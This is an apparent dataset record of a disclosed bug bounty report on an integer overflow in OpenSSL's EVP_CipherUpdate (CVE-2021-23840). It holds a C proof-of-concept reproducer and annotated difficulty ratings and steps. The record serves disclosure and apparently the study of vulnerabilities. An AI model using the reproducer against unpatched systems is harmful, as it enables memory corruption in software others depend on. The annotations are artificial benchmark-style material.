{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "reaperhulk ",
  "title": "Integer overflow in CipherUpdate",
  "content": "\nSummary:\nI reported an integer overflow to the OpenSSL security list on Dec 13, 2020 and it was fixed in OpenSSL 1.1.1j. Reporting it here for the bounty. It was assigned CVE-2021-23840 (https://nvd.nist.gov/vuln/detail/CVE-2021-23840) which NVD rated CVSS 7.5. Amusingly, the same bug (worked around by my library pyca/cryptography before 1.1.1j was released) was assigned CVE-2020-36242 (https://nvd.nist.gov/vuln/detail/CVE-2020-36242), which received a 9.1 CVSS from NVD.\nSteps To Reproduce:\nThe below is a reproducer for prior to 1.1.1j.\nCode 883 Bytes\n1#include <stdio.h>\n2#include <stdlib.h>\n3#include <assert.h>\n4#include <openssl/evp.h>\n5\n6int main() {\n7    int res;\n8    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();\n9    assert(ctx != NULL);\n10    unsigned char key[] = \"0000000000000000\";\n11    unsigned char iv[] = \"0000000000000000\";\n12    res = EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv, 1);\n13    assert(res == 1);\n14    int intmax = 2147483647;\n15    void *inbuf = malloc(intmax);\n16    void *outbuf = malloc((size_t)2147483648);\n17    int outlen = 0;\n18    unsigned char data[] = \"0\";\n19    res = EVP_CipherUpdate(ctx, outbuf, &outlen, data, 1);\n20    printf(\"Processed %i bytes, outlen: %i, res: %i\\n\", 1, outlen, res);\n21    assert(res == 1);\n22    outlen = 0;\n23    res = EVP_CipherUpdate(ctx, outbuf, &outlen, (unsigned char\n24*)inbuf, intmax);\n25    assert(res == 1);\n26    printf(\"Processed %i bytes, outlen: %i, res: %i\\n\", intmax, outlen, res);\n27}\nImpact\nThis returned negative output length, which, when combined with common use of pointer arithmetic in buffers results in accessing incorrect regions of memory (typically this would manifest as a segfault due to the size of the negative value, but that is not guaranteed).\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Integer Overflow"
  ],
  "screenshots": {},
  "disclosed_date": 1617868500,
  "report_url": "https://hackerone.com/reports/1113025",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Initialize EVP_CIPHER_CTX and set up AES-128-CBC cipher with key and IV"
    ],
    [
      2,
      "Allocate large input and output buffers (intmax and 2147483648 bytes respectively)"
    ],
    [
      3,
      "Call EVP_CipherUpdate with a small input (1 byte) to initialize processing"
    ],
    [
      4,
      "Call EVP_CipherUpdate again with the maximum integer value (2147483647 bytes) as input length"
    ]
  ],
  "vuln_description": "An integer overflow in OpenSSL's CipherUpdate function when processing large input sizes, which can result in negative output lengths and potential memory corruption when combined with pointer arithmetic in buffer handling.",
  "reason": "The vulnerability requires understanding of cryptographic buffer handling and integer overflow conditions, but the reproduction steps are straightforward once the overflow condition is known. The main complexity comes from recognizing the impact of negative lengths on memory operations.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}